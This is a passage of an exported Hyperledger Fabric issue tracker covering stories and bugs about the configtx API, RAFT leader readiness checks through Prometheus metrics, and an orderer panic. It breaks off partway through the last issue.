 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:591
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.newQueryScanner
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:881
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*VersionedDB).ExecuteQueryWithMetadata
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:573
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*VersionedDB).ExecuteQuery
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:537
 github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.TestHandleChaincodeDeployErroneousIndexFile
 /Users/senthil/go/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb_test.go:740
 testing.tRunner
 /usr/local/go/src/testing/testing.go:992
 runtime.goexit
 /usr/local/go/src/runtime/asm_amd64.s:1373
 Test: TestHandleChaincodeDeployErroneousIndexFile
 statecouchdb_test.go:89: Cleaningup TestVDBEnv

{code}
",,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01axn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Apr/20 10:49 PM;denyeart;https://github.com/hyperledger/fabric/pull/1072;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Check if RAFT election is finished and OSN is ready to accept transactions,FAB-17738,44795,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,,arman19940326,arman19940326,14/Apr/20 12:26 AM,31/Aug/21 2:11 PM,28/Oct/23 3:09 AM,17/Apr/21 4:24 AM,v1.4.6,,,,,,,,,,,,,fabric-orderer,,,,,,,,,1,,,,,,"It takes some time for RAFT nodes to start accepting transactions when there are multiple orderer organizations each with multiple ordering nodes. I want to know if there is any way to constantly check the readiness of nodes. Right after they're ready to accept transactions, I want to create a channel and join peers. I checked orderers' logs but I can't find a way to automate the process. I also looked at Prometheus metrics. Apparently in Fabric v2.0 there is a way to check active nodes in the channel by reading consensus_etcdraft_active_nodes info from orderer's exporter but this isn't the case in Fabric v1.4.6. ",,arman19940326,AshishkumarLakshmanan,baohua,jyellick,lucianoribas,mplisov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ayb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),arman19940326,AshishkumarLakshmanan,baohua,jyellick,lucianoribas,mplisov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Apr/20 6:57 AM;baohua;This is a good point, and would suggest extend to check whether the channel is healthy, e.g.., leader is elected, quorum exist.;;;","29/Apr/20 5:08 AM;arman19940326;I know this is not a perfect solution but I use this hack to check if RAFT election is finished. It worked for me.

I run my tests on Kubernetes. I first wait till all orderer pods are up and ready then this snippet in my bash script checks if leader is elected and quorum exists:

 
{code:java}
echo ""Wait till RAFT nodes are ready to accept transactions!""
ORDERERS=$(kubectl get svc | awk '/orderer[0-9]*-org[0-9]*/ {print $3}')
while [ true ]; do 
    for ORDERER in $ORDERERS; do
        IS_LEADER=$(curl -v --silent http://${ORDERER}:8443/metrics 2>&1 | awk '/^consensus_etcdraft_is_leader/ {print $2}') 
        [ ""${IS_LEADER}"" == ""1"" ] && break 
    done 
    [ ""${IS_LEADER}"" == ""1"" ] && break 
    sleep 1
done
echo ""ordering service is ready to accept transactions!""
{code}
I enabled Prometheus on orderer nodes to get operational metrics. I found out that if in any of the orderer nodes the variable _consensus_etcdraft_is_leader_ is set to one, then we have a leader and election is finished.

Fabric documentation says:
{quote}{{consensus_etcdraft_is_leader}}: identifies which node in the cluster is currently leader. If no nodes have this set, you have lost quorum.
{quote}
 

*Edit:  I should've said this a while ago ... After running multiple tests I realized this does not always work. Sometimes it fails when I create a channel right after the above script. I got this error:*
{quote} *\{""status"":""SERVICE_UNAVAILABLE"",""info"":""no Raft leader""}*
{quote}
*The script I wrote finishes when a leader is elected in the RAFT network. Maybe there is another RAFT election right after a leader is elected. I don't know...  I'm still waiting for Hyperledger Fabric team to provide a solution to this issue.*;;;","17/Apr/21 4:24 AM;jyellick;The issue points out that there are better options in v2.x, we are done with non-bug-fixes for v1.4.x;;;","31/Aug/21 3:14 AM;lucianoribas;Just two improvements:
 * WHEN you are not using Kubernetes: Get the orderers from configtx.yaml file.
 * WHEN you have more than one channel: you need 'grep sys-channel'

{code:bash}
echo ""#####  Wait till RAFT nodes are ready to accept transactions!  #######""
#for kubernetes
#ORDERERS=$(kubectl get svc | awk '/orderer[0-9]*-org[0-9]*/ {print $3}')
ORDERERS=$(yq -j r configtx.yaml | jq '.Orderer.EtcdRaft.Consenters[].Host' | tr -d '""')while [ true ]; do
    for ORDERER in $ORDERERS; do
        IS_LEADER=$(curl -v --silent http://${ORDERER}:8443/metrics 2>&1 | grep sys-channel | awk '/^consensus_etcdraft_is_leader/ {print $2}')
        [ ""${IS_LEADER}"" == ""1"" ] && break
        echo ${ORDERER} : ${IS_LEADER}
    done
    [ ""${IS_LEADER}"" == ""1"" ] && break
    sleep 1
done
echo ""ordering service is ready to accept transactions!""{code}
 
  
  
 ;;;","31/Aug/21 2:10 PM;arman19940326;Yeah, you're right about greping channel name. I had changed my script a long time ago but didn't update my answer here. Since election takes place for each channel independently, I made a bash function to use it for each channel creation. 
  
{code:java}
wait_for_raft() {
  CHANNEL_NAME=""$1""
  echo""################# Wait till RAFT nodes are ready to accept transactions #################""
  ORDERERS=$(kubectl get svc -l ""hyperledger-fabric-component=orderer"" | awk '{print $3}')
  while [ true ];do
    for ORDERER in ${ORDERERS};do
      IS_LEADER=$(curl -v --silent http://${ORDERER}:8443/metrics 2>&1 | grep ""${CHANNEL_NAME}"" | awk '/^consensus_etcdraft_is_leader/ {print $2}')
      [ ""${IS_LEADER}"" == ""1"" ] && break
    done
    [ ""${IS_LEADER}"" == ""1"" ] && break
    sleep 1
  done
  echo""ordering service is now ready to accept transactions!""
}{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
improve readability of HandleChaincodeDeploy,FAB-17739,44796,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,14/Apr/20 2:33 AM,18/Apr/20 2:38 PM,28/Oct/23 3:09 AM,18/Apr/20 2:38 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ayj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add configtx package documentation,FAB-17740,44797,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 4:08 AM,17/Apr/20 11:08 PM,28/Oct/23 3:09 AM,17/Apr/20 11:08 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to see an Overview section in the GoDocs that explains the purpose and usage of the configtx package. Maybe also mention how channels are structured.

 

*Acceptance*

I can open the GoDocs and find an Overview section for the configtx package that clearly explains what the library is for.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzr",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Apr/20 12:48 AM;tsharris;[pkg.go.dev|[https://pkg.go.dev/github.com/hyperledger/fabric/pkg/config?tab=doc]] serves the go documentation with overview section while [godoc.org|[https://godoc.org/github.com/hyperledger/fabric/pkg/config]] does not.;;;","15/Apr/20 9:07 PM;tsharris;[https://github.com/hyperledger/fabric/pull/1096];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend SigningIdentity with config update signing functions,FAB-17741,44798,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,caod,caod,14/Apr/20 4:13 AM,17/Apr/20 5:06 AM,28/Oct/23 3:09 AM,17/Apr/20 4:41 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to use a signing identity to create config update signatures. Currently when opening the GoDoc the first function we see is CreateSignedConfigUpdateEnvelope, which is quite a wordy first impression. Let's consider renaming this to just SignConfigUpdateEnvelope (not to be confused with the existing SignConfigUpdate) and extend the SigningIdentity to potentially encapsulate both SignConfigUpdate and SignConfigUpdateEnvelope. The GoDoc documentation should explain the usage and differences between the two. 

 

*Acceptance*

SigningIdentity should be extended with SignConfigUpdate at the minimum. Consider also extending with  the renamed SignConfigUpdateEnvelope if deemed necessary.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzw",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Apr/20 4:41 AM;caod;[https://github.com/hyperledger/fabric/pull/1089];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Convert AddXXX and UpdateXXX functions to SetXXX,FAB-17742,44799,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,14/Apr/20 4:27 AM,24/Apr/20 2:44 AM,28/Oct/23 3:09 AM,24/Apr/20 2:44 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to call Set functions for setting values on the updated config. Currently the Add functions check that the existing config does not already have the value being added. Let's convert this behavior to just override whatever config value the consumer is intending to set. Let's also rename the UpdateXXX functions to use the Set prefix for consistency purposes.

 

*Acceptance*

All AddXXX and UpdateXXX functions in the configtx package have been updated to SetXXX and support replacing the value being added. These functions should not error if the value being set already exists and should instead replace them. Use careful discretion when applying this behavior to slices (ie. SetAnchorPeer) as the struct is not a map. The goal is a duplicate is not added in these cases where an existing AnchorPeer may already exist in the slice. The examples should be updated where applicable to use the new SetXXX functions. The GoDoc should also be updated to properly reflect existing values will be overwritten where applicable.",,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzx",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Apr/20 11:23 AM;dereckluo;part 1: https://github.com/hyperledger/fabric/pull/1113;;;","22/Apr/20 3:05 AM;dereckluo;part 2: https://github.com/hyperledger/fabric/pull/1139;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename ConfigTx.Base() and ConfigTx.Updated(),FAB-17743,44800,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 4:32 AM,18/Apr/20 3:51 AM,28/Oct/23 3:09 AM,18/Apr/20 3:51 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I'd like to call more appropriate functions on a ConfigTx type that return the base and updated config. Currently the function Base() isn't very clear as to what it should accomplish. We should consider renaming this to something more appropriate (eg. BaseConfig, OriginalConfig, OldConfig, etc...) and likewise rename Updated() to something similar (ie UpdatedConfig).

 

*Acceptance*

The Base() and Updated() functions and associated GoDocs are updated to reflect the new names.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzx9",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Apr/20 6:40 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1102];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chain config type APIs,FAB-17744,44801,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,caod,caod,14/Apr/20 4:39 AM,12/May/20 11:18 PM,28/Oct/23 3:09 AM,12/May/20 11:18 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to chain the API calls when attempting to update or retrieve values in the config. Currently the ConfigTx type supports all of the add/remove/set/update functions for all values on the config. Let's consider extending sub types with their associated getters and setters so we change from calling:

c.AddAnchorPeers(...) -> c.Application().Org(orgName).AddAnchorPeer()

Use careful consideration when determining how to and which types to wrap for the intermediary subtypes. In the example above, should ConfigTx contain references to a configtx.Application type which wraps a ConfigGroup proto?

 

*Acceptance*

I can chain API calls for getting/setting values on a config. The examples and GoDoc should be updated accordingly.",,caod,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzy",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/May/20 11:18 PM;wlahti;https://github.com/hyperledger/fabric-config/pull/11;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move Orderer related types to an orderer subpackage,FAB-17745,44802,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 4:46 AM,23/Apr/20 6:31 AM,28/Oct/23 3:09 AM,23/Apr/20 6:31 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric API, I would like to reference orderer related types in a separate namespace from configtx. Currently a consumer would pass a configtx.Orderer type which has configtx.BatchSize, configtx.Kafka, etc properties. The subproperty types should be moved to a separate orderer package within the configtx library such that they can be referenced as orderer.Kafka, orderer.BatchSize, etc. Consider if it would look better to also create new types for orderer.Policies of type map[string]Policy (this may not be cleanly possible since we use shared functions for all types of policies). Note this story is only for namespacing the types, no functions should be moved unless deemed necessary/more appropriate to live in the orderer subpackage.

 

*Acceptance*

I can find a new orderer folder/package within the configtx package that contains the orderer related types for Kafka, EtcdRaft, BatchSize, ConsensusState. The new Orderer package should be well documented/have a well formed GoDoc.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17746,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Apr/20 12:19 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1128];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move MSP related types to a membership subpackage,FAB-17746,44803,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 4:47 AM,23/Apr/20 7:12 AM,28/Oct/23 3:09 AM,23/Apr/20 7:12 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric API, I would like to reference msp related types in a separate namespace from configtx. Currently a consumer would pass a configtx.MSP type which has configtx.CryptoConfig, configtx.NodeOUs, etc properties. The subproperty types should be moved to a separate membership package within the configtx library such that they can be referenced as membership.CryptoConfig, membership.NodeOUs, etc. Note this story is only for namespacing the types, no functions should be moved unless deemed necessary/more appropriate to live in the membership subpackage.

 

*Acceptance*

I can find a new membership folder/package within the configtx package that contains the msp related types for SigningIdentityInfo, OUIdentifier, CryptoConfig, NodeOUs,. The new Orderer package should be well documented/have a well formed GoDoc.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17745,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxk",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Apr/20 4:01 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1134];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removal functions should be idempotent,FAB-17747,44804,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 4:55 AM,21/Apr/20 9:00 PM,28/Oct/23 3:09 AM,21/Apr/20 9:00 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to remove values from a config and expect no error to occur if the value attempting to be removed does not exist. If a value being removed doesn't already exist then it should be expected that the resulting updated config doesn't contain the value being removed inherently so there is no need to error in these cases. Consider removing the returned error entirely if it makes sense.

 

*Acceptance*

Calling a removal function with a value that does not exist does not return any error. The GoDoc should clearly explain this behavior.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxc",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Apr/20 2:45 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1117];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve GoDoc for config library,FAB-17748,44805,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,14/Apr/20 5:04 AM,25/Apr/20 9:11 AM,28/Oct/23 3:09 AM,25/Apr/20 2:14 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API GoDocs, I would like to see better documentation around configtx.New(). There are also a couple of unnecessary examples that add nothing to the GoDoc and can be removed, namely 
 * [ConfigTx.AddApplicationCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-AddApplicationCapability]
 * [ConfigTx.AddChannelCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-AddChannelCapability]
 * [ConfigTx.AddOrdererCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-AddOrdererCapability]
 * [ConfigTx.RemoveApplicationCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-RemoveApplicationCapability]
 * [ConfigTx.RemoveChannelCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-RemoveChannelCapability]
 * [ConfigTx.RemoveOrdererCapability|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-RemoveOrdererCapability]
 * [ConfigTx.UpdateApplicationMSP|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-ConfigTx-UpdateApplicationMSP]
 * [New|https://godoc.org/github.com/hyperledger/fabric/pkg/config#example-New]

since these examples just demonstrate how to call the function.

As part of this story, let's also rename the Example_xxx functions to be more appropriate for what they are examples for (ie. Example_systemChannel should just be Example_textExample since it's the overall flow for how to compute and sign a config update. You may need to clarify the proper GoDoc metadata for this). Let's also split up the Example_XXX examples into more distinct examples (ie Example_ACLs which demonstrate quick usage for adding/removing ACLs).

 

While we're at it lets also remove the Output validation from the examples since they don't add much.

One final nit: try to keep the code blocks in the generated GoDocs from needing to scroll horizontally by introducing linebreaks where appropriate.

 

GoDocs can be generated locally by running
{code:java}
godoc -http=:2020 {code}
in the terminal then navigating to localhost in the browser{{}}
{code:java}
http://localhost:2020/pkg/github.com/hyperledger/fabric/pkg/configtx/{code}
*Acceptance*
 * Unnecessary examples removed
 * Better documentation around New
 * Example_XXX functions renamed
 * Additional smaller Example_XXX functions for different values (ie. Example_policyRetrieval, Example_ordererUpdate, Example_membership, etc)
 * Output validation removed from examples
 * No horizontal scroll on any code blocks in the GoDocs",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxo",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Apr/20 5:00 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1142];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Placeholder: Isolate system channel related features where applicable,FAB-17749,44806,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,caod,caod,14/Apr/20 5:09 AM,14/Apr/20 5:09 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,,,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8zs2",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Get the RAFT leader of the channel using the operational API,FAB-17750,44807,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,baohua,baohua,14/Apr/20 7:00 AM,17/Apr/21 4:26 AM,28/Oct/23 3:09 AM,17/Apr/21 4:26 AM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"In raft, the leader may be elected periodically due to status change.

During that time, the channel is not valid to accept any transaction.

On the other hand, clients may want to send transactions to the leader directly.

If we can provide an API to get the leader of the channel, that will be helpful.",,baohua,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ayr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Apr/21 4:26 AM;jyellick;This story needs more detail.

It might be possible to report more details of the leader status via the channel participation API, but the utility is questionable.  Ultimately, in an asynchronous system, no node can guarantee the current state of the cluster, and after reading from the API the state may immediately change.  Can you please elaborate more on the intended purpose of these extensions and re-open?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RAFT OSN may panic with repeatedly adding/removing OSN from the channel,FAB-17751,44808,,Bug,Unverified,FAB,Fabric,software,denyeart,,,High,,,baohua,baohua,14/Apr/20 7:06 AM,20/Jul/20 11:06 PM,28/Oct/23 3:09 AM,,v1.4.6,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"Test with release-v1.4 branch (b03b3d9fe at April 10, 2020).

Repeatedly add or remove OSN (see etcdraft_reconfig_test.go in the attachment).

Sometimes, there will be OSN panic with log of

```

